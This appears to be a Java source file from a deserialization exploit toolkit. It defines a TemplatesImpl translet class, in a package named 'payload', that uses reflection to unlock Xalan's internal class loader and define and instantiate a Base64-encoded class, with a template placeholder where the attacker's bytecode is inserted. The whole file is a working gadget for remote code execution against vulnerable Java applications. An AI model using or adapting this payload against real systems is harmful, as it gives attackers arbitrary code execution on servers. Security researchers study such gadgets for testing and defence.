package payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Base64;

public class TemplateImplClassLoader extends AbstractTranslet {
    public TemplateImplClassLoader() throws Exception {
        Class loader = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader");
        Method defineClass = loader.getDeclaredMethod("defineClass", byte[].class);
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("{{base64Class}}");
        Constructor constructor = loader.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        ((Class)defineClass.invoke(constructor.newInstance(ClassLoader.getSystemClassLoader()), code)).newInstance();
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
